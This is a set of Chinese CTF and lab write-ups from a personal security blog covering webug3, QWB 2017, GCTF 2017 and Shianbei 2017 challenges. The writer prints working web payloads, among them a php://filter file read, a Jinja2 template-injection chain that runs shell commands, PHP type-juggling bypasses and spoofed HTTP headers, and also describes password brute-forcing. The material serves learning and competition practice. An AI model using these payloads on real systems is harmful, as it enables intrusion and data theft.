<p>因为是require_once，所以不能直接读index.php，这，不知应该怎么读了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=../../../../../../../../../../WINDOWS/win.ini</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/webug3/17.png" alt=""></p>
<h2 id="第二关-提交方式是怎么样的啊？"><a href="#第二关-提交方式是怎么样的啊？" class="headerlink" title="第二关:提交方式是怎么样的啊？"></a>第二关:提交方式是怎么样的啊？</h2><p>pass !<br>一样<br><img src="/img/webug3/18.png" alt=""></p>
<h2 id="第三关-我还是一个注入"><a href="#第三关-我还是一个注入" class="headerlink" title="第三关:我还是一个注入"></a>第三关:我还是一个注入</h2><p>怎么又TM注入？<br>有一个header注入<br><img src="/img/webug3/19.png" alt=""></p>
<h2 id="第四关-APK里面有一个flag"><a href="#第四关-APK里面有一个flag" class="headerlink" title="第四关:APK里面有一个flag"></a>第四关:APK里面有一个flag</h2><p>看看apk</p>
<ul>
<li><p>apktool 作用：资源文件获取，可以提取出图片文件和布局文件进行使用查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apktool d -f [apk文件 ] [输出文件夹]</span><br><span class="line">apktool d -f test.apk test    </span><br><span class="line">重新打包成apk</span><br><span class="line">apktool b test</span><br></pre></td></tr></table></figure>
</li>
<li><p>dex2jar 作用：将apk反编译成java源码（classes.dex转化成jar文件）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows</span><br><span class="line">.\dex2jar-2.0\d2j-dex2jar.bat .\output\test\classes.dex</span><br><span class="line">linux</span><br><span class="line">dex2jar classes.dex</span><br></pre></td></tr></table></figure>
</li>
<li><p>jd-gui 作用：查看APK中classes.dex转化成出的jar文件，即源码文件<br>直接用这个工具打开classes-dex2jar.jar</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(Base64.decode(&quot;YWZlOGU5MWI=&quot;, &quot;UTF-8&quot;))).append(Base64.decode(&quot;NGM1NGFkOGVi&quot;, &quot;UTF-8&quot;)).toString())).append(Base64.decode(&quot;MzA0M2UzNjY=&quot;, &quot;UTF-8&quot;)).toString() + Base64.decode(&quot;ZGJjYTA1Zg==&quot;, &quot;UTF-8&quot;);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>看到代码了，base64-decode一下<br>afe8e91b4c54ad8eb4c54ad8eb3043e366dbca05f</p>
<h2 id="第五关-时间注入"><a href="#第五关-时间注入" class="headerlink" title="第五关:时间注入"></a>第五关:时间注入</h2><p>时间注入<br>时间盲注<br><img src="/img/webug3/20.png" alt=""></p>
<h2 id="实战练习-DZ论坛"><a href="#实战练习-DZ论坛" class="headerlink" title="实战练习:DZ论坛"></a>实战练习:DZ论坛</h2><p>注入<br>实战题~好像搭建的不怎么OK，先不做</p>
<h2 id="实战练习-aspcms"><a href="#实战练习-aspcms" class="headerlink" title="实战练习:aspcms"></a>实战练习:aspcms</h2><p>注入</p>
<h2 id="实战练习-phpmyadmin"><a href="#实战练习-phpmyadmin" class="headerlink" title="实战练习:phpmyadmin"></a>实战练习:phpmyadmin</h2><p>任意文件包含漏洞</p>
<h2 id="实战练习-齐博系统"><a href="#实战练习-齐博系统" class="headerlink" title="实战练习:齐博系统"></a>实战练习:齐博系统</h2><p>SQL注入</p>
<h2 id="实战练习-海盗云商"><a href="#实战练习-海盗云商" class="headerlink" title="实战练习:海盗云商"></a>实战练习:海盗云商</h2><p>getshell</p>
<h2 id="实战练习-PHP168-6-0"><a href="#实战练习-PHP168-6-0" class="headerlink" title="实战练习:PHP168 6.0"></a>实战练习:PHP168 6.0</h2><p>任意代码执行GET SHELL</p>
<h2 id="实战练习-ecshop"><a href="#实战练习-ecshop" class="headerlink" title="实战练习:ecshop"></a>实战练习:ecshop</h2><p>/admin/shopinfo.php SQL注入</p>
<h2 id="实战练习-ShopXp系统v3-x"><a href="#实战练习-ShopXp系统v3-x" class="headerlink" title="实战练习:ShopXp系统v3.x"></a>实战练习:ShopXp系统v3.x</h2><p>SQL注射漏洞</p>
<h2 id="实战练习-Dcore-轻型CMS系统"><a href="#实战练习-Dcore-轻型CMS系统" class="headerlink" title="实战练习:Dcore(轻型CMS系统)"></a>实战练习:Dcore(轻型CMS系统)</h2><p>注入漏洞</p>
<h2 id="实战练习-MetInfo-5-1-7"><a href="#实战练习-MetInfo-5-1-7" class="headerlink" title="实战练习:MetInfo 5.1.7"></a>实战练习:MetInfo 5.1.7</h2><p>任意文件包含漏洞可getshell</p>
<h2 id="实战练习-Metinfo-5-3"><a href="#实战练习-Metinfo-5-3" class="headerlink" title="实战练习:Metinfo 5.3"></a>实战练习:Metinfo 5.3</h2><p>news.php盲注</p>
<h1 id="实战拓展"><a href="#实战拓展" class="headerlink" title="实战拓展"></a>实战拓展</h1><h2 id="实战练习-Metinfo5-3"><a href="#实战练习-Metinfo5-3" class="headerlink" title="实战练习:Metinfo5.3"></a>实战练习:Metinfo5.3</h2><p>img.php盲注</p>
<h2 id="实战练习-万众电子期刊在线阅读系统PHP和ASP"><a href="#实战练习-万众电子期刊在线阅读系统PHP和ASP" class="headerlink" title="实战练习:万众电子期刊在线阅读系统PHP和ASP"></a>实战练习:万众电子期刊在线阅读系统PHP和ASP</h2><p>SQL注入</p>
<h2 id="实战练习-BEESCMS"><a href="#实战练习-BEESCMS" class="headerlink" title="实战练习:BEESCMS"></a>实战练习:BEESCMS</h2><p>sql注入</p>
<h2 id="实战练习-ourphpV1-3-1"><a href="#实战练习-ourphpV1-3-1" class="headerlink" title="实战练习:ourphpV1.3.1"></a>实战练习:ourphpV1.3.1</h2><p>注入</p>
<h2 id="实战练习-phpwind"><a href="#实战练习-phpwind" class="headerlink" title="实战练习:phpwind"></a>实战练习:phpwind</h2><p>版本命令执行漏洞</p>
<h2 id="实战练习-metinfo-5-1以下"><a href="#实战练习-metinfo-5-1以下" class="headerlink" title="实战练习:metinfo 5.1以下"></a>实战练习:metinfo 5.1以下</h2><p>任意用户密码修改</p>
<h2 id="实战练习-DZ3-2"><a href="#实战练习-DZ3-2" class="headerlink" title="实战练习:DZ3.2"></a>实战练习:DZ3.2</h2><p>存储型跨站</p>
<h2 id="实战练习-DedeCMS"><a href="#实战练习-DedeCMS" class="headerlink" title="实战练习:DedeCMS"></a>实战练习:DedeCMS</h2><p>flink.php友情链接注入</p>
<h2 id="实战练习-DedeCms"><a href="#实战练习-DedeCms" class="headerlink" title="实战练习:DedeCms"></a>实战练习:DedeCms</h2><p>recommend.php注入</p>
<h2 id="实战练习-BEESCMS-1"><a href="#实战练习-BEESCMS-1" class="headerlink" title="实战练习:BEESCMS"></a>实战练习:BEESCMS</h2><p>注入</p>
<h2 id="实战练习-海洋cms"><a href="#实战练习-海洋cms" class="headerlink" title="实战练习:海洋cms"></a>实战练习:海洋cms</h2><p>头部注入</p>
<h2 id="实战练习-CVE-2006-7243"><a href="#实战练习-CVE-2006-7243" class="headerlink" title="实战练习:CVE-2006-7243"></a>实战练习:CVE-2006-7243</h2><p>php截断利用</p>
<h2 id="实战练习-CVE-2013-3660"><a href="#实战练习-CVE-2013-3660" class="headerlink" title="实战练习:CVE-2013-3660"></a>实战练习:CVE-2013-3660</h2><p>本地提权</p>
<h2 id="实战练习-IIS-6-0"><a href="#实战练习-IIS-6-0" class="headerlink" title="实战练习:IIS 6.0"></a>实战练习:IIS 6.0</h2><p>远程命令执行</p>
<h2 id="实战练习-HFS"><a href="#实战练习-HFS" class="headerlink" title="实战练习:HFS"></a>实战练习:HFS</h2><p>第三方软件提权</p>
<h2 id="实战练习-MYsql"><a href="#实战练习-MYsql" class="headerlink" title="实战练习:MYsql"></a>实战练习:MYsql</h2><p>数据库提权</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ultramangaia.github.io/blog/2017/强网杯-ctf-2017.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="UltramanGaia">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="UltramanGaia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2017/强网杯-ctf-2017.html" itemprop="url">强网杯-ctf-2017</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-27T19:36:03+08:00">
                2017-11-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/writeup/" itemprop="url" rel="index">
                    <span itemprop="name">writeup</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="broken"><a href="#broken" class="headerlink" title="broken"></a>broken</h1><p><img src="/img/qwb/1.png" alt=""><br>Jsfuck<br>直接console中跑发现报错<br><img src="/img/qwb/2.png" alt=""><br>后面加个]<br><img src="/img/qwb/3.png" alt=""></p>
<p>看到最后面的()，应该是函数调用，去掉<br><img src="/img/qwb/4.png" alt=""></p>
<h1 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h1><p><img src="/img/qwb/5.png" alt=""><br>设置cookie<br><img src="/img/qwb/6.png" alt=""><br>还是没有权限，从cookie入手，base64解码<br><img src="/img/qwb/7.png" alt=""><br>thrfg怎么看都没意义，后来想到rot13<br><img src="/img/qwb/8.png" alt=""><br>嗯，改guest为admin，rot13-&gt;base64<br><img src="/img/qwb/9.png" alt=""><br><img src="/img/qwb/10.png" alt=""><br>用post上传，指定filename和data。<br>尝试上传php木马，发现会检测左尖括号。<br><img src="/img/qwb/11.png" alt=""><br>尝试绕过无果，后来想到检测左尖括号可能可以用数组绕过<br><img src="/img/qwb/12.png" alt=""><br>直接给flag<br><img src="/img/qwb/13.png" alt=""></p>
<h1 id="phone-number"><a href="#phone-number" class="headerlink" title="phone number"></a>phone number</h1><p>逻辑就是注册账号包括手机号信息，登录，check有多少个具有相同手机号的账号。<br>看到check页面中，<br><img src="/img/qwb/14.png" alt=""><br>admin的电话藏有大秘密。<br>尝试账号密码注入失败，结合题目，应该是通过手机号注入的。<br>提交一般字符串，提示<br><img src="/img/qwb/15.png" alt=""><br>，后面发现提交0e科学计数法和0x的hex编码可以绕过，insert点在注册的手机号这里，<br>输出点在check页面，可以insert注入。<br><img src="/img/qwb/16.png" alt=""><br><img src="/img/qwb/17.png" alt=""><br>而且是union注入。<br><img src="/img/qwb/18.png" alt=""><br><img src="/img/qwb/19.png" alt=""><br>数据库名webdb<br><img src="/img/qwb/20.png" alt=""><br><img src="/img/qwb/21.png" alt=""><br>表名为user<br><img src="/img/qwb/22.png" alt=""><br><img src="/img/qwb/23.png" alt=""><br>发现没有返回列名，然后看到<br><img src="/img/qwb/24.png" alt=""><br>原来长度有限制，简化下<br><img src="/img/qwb/25.png" alt=""><br><img src="/img/qwb/26.png" alt=""><br>得到列名id，username，phone，password<br><img src="/img/qwb/27.png" alt=""><br>拿数据，得flag.</p>
<h1 id="Musee-de-X"><a href="#Musee-de-X" class="headerlink" title="Musee de X"></a>Musee de X</h1><p>scimg.jb51.net/allimg/150811/14-150Q1142KAF.jpg<br>报错信息中发现有jinja2<br><img src="/img/qwb/28.png" alt=""><br>直接搜索python SSTI找到<br><img src="/img/qwb/29.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/qwb/30.png" alt=""><br>这水印输出字符长度有限制。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[59]&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/qwb/31.png" alt=""><br>找到catch_warnings类了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[59] .\_\_init\_\_.func\_globals[&apos;linecache&apos;].\_\_dict\_\_[&apos;o&apos;+&apos;s&apos;].\_\_dict\_\_[&apos;pop&apos;+&apos;en&apos;](&apos;ls&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/qwb/32.png" alt=""><br>发现flag文件，已经发现水印输出中过滤了一些字符，可以猜测flag文件名为flag_8d294abea9f0，额，不用猜直接flag*。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\_\_class\_\_.\_\_mro\_\_[2].\_\_subclasses\_\_()[59] .\_\_init\_\_.func\_globals[&apos;linecache&apos;].\_\_dict\_\_[&apos;o&apos;+&apos;s&apos;].\_\_dict\_\_[&apos;pop&apos;+&apos;en&apos;](&apos;cat flag\_\*&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/qwb/33.png" alt=""><br>额，看不全，找张大图<br><a href="http://pic1.win4000.com/wallpaper/d/58c0f570b231b.jpg" target="_blank" rel="noopener">http://pic1.win4000.com/wallpaper/d/58c0f570b231b.jpg</a><br><img src="/img/qwb/34.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;06015a4f-8d29-4abe-a9f0-e1cb18911671&#125;</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ultramangaia.github.io/blog/2017/gctf-ctf-2017.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="UltramanGaia">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="UltramanGaia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2017/gctf-ctf-2017.html" itemprop="url">gctf-ctf-2017</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-27T19:31:56+08:00">
                2017-11-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/writeup/" itemprop="url" rel="index">
                    <span itemprop="name">writeup</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="2017-首届全球华人网络安全技能大赛"><a href="#2017-首届全球华人网络安全技能大赛" class="headerlink" title="2017 首届全球华人网络安全技能大赛"></a>2017 首届全球华人网络安全技能大赛</h1><h2 id="热身题"><a href="#热身题" class="headerlink" title="热身题"></a>热身题</h2><p><img src="img/gctf/1.png" alt=""><br>检查了下robots.txt，</p>
<blockquote>
<p>#</p>
<h1 id="robots-txt-for-Topsec-CTF"><a href="#robots-txt-for-Topsec-CTF" class="headerlink" title="robots.txt for Topsec CTF"></a>robots.txt for Topsec CTF</h1><p>#<br>User-agent: *<br>Disallow: /caches<br>Disallow: /phpcms/config.txt<br>Disallow: /install<br>Disallow: /phpsso_server<br>Disallow: /api.txt<br>Disallow: /Admin.aspx<br>Disallow: /te1t.txt<br>Disallow: /dede<br>Disallow: /m3mber<br>Disallow: /setup<br>Disallow: /uping<br>Disallow: /templets<br>Disallow: /default<br>Disallow: /index.html<br>Disallow: /js.txt<br>Disallow: /login.php<br>Disallow: /rob0t.php<br>Disallow: /admin.php<br>Disallow: /1ndex.txt<br>Disallow: /freelist<br>Disallow: /html<br>Disallow: /include</p>
<p>尝试直到发现/rob0t.php</p>
</blockquote>
<p>———————–Congratulation!—————————<br>GCTF{ae609880185f1d75}</p>
<h2 id="变态验证码"><a href="#变态验证码" class="headerlink" title="变态验证码"></a>变态验证码</h2><p>搜了一下几种绕验证码的方式，都试了一下，发现只要第一次输对了验证码，后面直接把验证码设为空串就行了，然后用Burp和他给的password.txt爆破一下就行了</p>
<h2 id="Forbidden"><a href="#Forbidden" class="headerlink" title="Forbidden"></a>Forbidden</h2><p><img src="img/gctf/2.png" alt=""></p>
<p>查看网页源代码，发现注释</p>
<p>X-Forwarded-For:localhost</p>
<p>又发现提示了www.topsec.com</p>
<blockquote>
<p>Host: www.topsec.com</p>
</blockquote>
<p>Referer: <a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a></p>
<p>模拟ajax请求头</p>
<blockquote>
<p>X-Requested-With:XMLHttpRequest</p>
</blockquote>
<p>User-Agent 添加</p>
<blockquote>
<p>MSIE 4;</p>
</blockquote>
<p>User-Agent 添加</p>
<blockquote>
<p>.NET CLR 8;</p>
</blockquote>
<p>修改下Accept-Language</p>
<blockquote>
<p>Accept-Language: de-DE,de;</p>
</blockquote>
<p>这里比较考脑洞了，看到response中有Set-Cookie : login=4e6a59324d545a6a4e7a4d324e513d3d</p>
<p>但是添加这个并没用。充分审题“没有登录”，又想不到什么办法，对login值进行decode</p>
<p><img src="img/gctf/3.png" alt=""></p>
<blockquote>
<p>4e6a59324d545a6a4e7a4d324e513d3d ———ASCII2Hex—-&gt;</p>
</blockquote>
<p>NjY2MTZjNzM2NQ== —————Base64——&gt;</p>
<p>66616c7365 ————–ASCII2Hex-&gt;</p>
<p>false</p>
<p>false 改成 true，反过来encode，得“4e7a51334d6a63314e6a553d”，再提交即可得flag。</p>
<p>最终<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: www.topsec.com</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; .NET CLR 8;MSIE 4; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8</span><br><span class="line">Accept-Language: de-DE,de;q=0.5</span><br><span class="line">Referer: http://www.baidu.com</span><br><span class="line">X-Forwarded-For:localhost</span><br><span class="line">X-Requested-With:XMLHttpRequest</span><br><span class="line">Cookie: lang=english; 8760CE88=1;login=4e7a51334d6a63314e6a553d</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ultramangaia.github.io/blog/2017/世安杯-ctf-2017.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="UltramanGaia">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="UltramanGaia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2017/世安杯-ctf-2017.html" itemprop="url">世安杯-ctf-2017</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-27T19:21:19+08:00">
                2017-11-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/writeup/" itemprop="url" rel="index">
                    <span itemprop="name">writeup</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="1-ctf-入门级题目"><a href="#1-ctf-入门级题目" class="headerlink" title="1. ctf 入门级题目"></a>1. ctf 入门级题目</h1><p>下源代码，发现可以利用ereg的00截断漏洞，burpsuite发送get请求/shian-rao/?password=1%00–</p>
<p><img src="/img/shianbei/1.png" alt=""></p>
<h1 id="2-曲奇饼"><a href="#2-曲奇饼" class="headerlink" title="2. 曲奇饼"></a>2. 曲奇饼</h1><p>访问，一段不知名文字，然后发现网址/shian-quqi/index.php?line=&amp;file=a2V5LnR4dA==</p>
<p>file参数明显base64加密过，base64解密为key.txt，然后我们修改为index.php，base64加密，加上line参数可以遍历index.php文件。得到源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file=base64_decode(isset($_GET[&apos;file&apos;])?$_GET[&apos;file&apos;]:&quot;&quot;);</span><br><span class="line">$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0;</span><br><span class="line">if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;file=a2V5LnR4dA==&quot;);</span><br><span class="line">$file_list = array(</span><br><span class="line">&apos;0&apos; =&gt;&apos;key.txt&apos;,</span><br><span class="line">&apos;1&apos; =&gt;&apos;index.php&apos;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&apos;key&apos;]) &amp;&amp; $_COOKIE[&apos;key&apos;]==&apos;li_lr_480&apos;)&#123;</span><br><span class="line">$file_list[2]=&apos;thisis_flag.php&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line">echo $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>容易发现只要将file参数值改为thisis_flag.php的base64后的值，并且添加cookie</p>
<p><img src="/img/shianbei/2.png" alt=""></p>
<h1 id="3-类型"><a href="#3-类型" class="headerlink" title="3. 类型"></a>3. 类型</h1><p>直接给了源码，通过php的弱类型漏洞绕过就好。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$a=0;</span><br><span class="line">$b=0;</span><br><span class="line">$c=0;</span><br><span class="line">$d=0;</span><br><span class="line">if (isset($_GET[&apos;x1&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">        $x1 = $_GET[&apos;x1&apos;];</span><br><span class="line">        $x1==&quot;1&quot;?die(&quot;ha?&quot;):NULL;</span><br><span class="line">        switch ($x1)</span><br><span class="line">        &#123;</span><br><span class="line">        case 0:</span><br><span class="line">        case 1:</span><br><span class="line">                $a=1;</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$x2=(array)json_decode(@$_GET[&apos;x2&apos;]);</span><br><span class="line">if(is_array($x2))&#123;</span><br><span class="line">    is_numeric(@$x2[&quot;x21&quot;])?die(&quot;ha?&quot;):NULL;</span><br><span class="line">    if(@$x2[&quot;x21&quot;])&#123;</span><br><span class="line">        ($x2[&quot;x21&quot;]&gt;2017)?$b=1:NULL;</span><br><span class="line">    &#125;</span><br><span class="line">    if(is_array(@$x2[&quot;x22&quot;]))&#123;</span><br><span class="line">        if(count($x2[&quot;x22&quot;])!==2 OR !is_array($x2[&quot;x22&quot;][0])) die(&quot;ha?&quot;);</span><br><span class="line">        $p = array_search(&quot;XIPU&quot;, $x2[&quot;x22&quot;]);</span><br><span class="line">        $p===false?die(&quot;ha?&quot;):NULL;</span><br><span class="line">        foreach($x2[&quot;x22&quot;] as $key=&gt;$val)&#123;</span><br><span class="line">            $val===&quot;XIPU&quot;?die(&quot;ha?&quot;):NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        $c=1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$x3 = $_GET[&apos;x3&apos;];</span><br><span class="line">if ($x3 != &apos;15562&apos;) &#123;</span><br><span class="line">    if (strstr($x3, &apos;XIPU&apos;)) &#123;</span><br><span class="line">        if (substr(md5($x3),8,16) == substr(md5(&apos;15562&apos;),8,16)) &#123;</span><br><span class="line">            $d=1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123;</span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>“==”弱类型，则x1=b，<br>“is_numeric“ 直接用2018bcd绕过，后面比较的时候转换为数值2018，得b1=1<br>“array_search“弱类型漏洞，”XIPU”字符串转数字为0，然后后面的“$var===’XIPU’”由于会检查类型，所以可以绕过<br>所以可以构造x2={“x21”:”2018a”,”x22”:[[0,1],0]}<br>后面的md5直接爆破即可，x3=XIPU18570</p>
<p><img src="/img/shianbei/3.png" alt=""></p>
<h1 id="4-登录"><a href="#4-登录" class="headerlink" title="4. 登录"></a>4. 登录</h1><p>用户名默认了，密码看网页源代码有提示说为5位数字，验证码是非图片验证码，直接可以拿到<br>所以，爆破吧，生成一个00000-99999的字典，一个get拿到验证码，然后一个get测试一个密码，然后，建议开个多线程。<br>这里直接利用工具了，pkav HHTP Fuzzer<br><img src="/img/shianbei/6.png" alt=""></p>
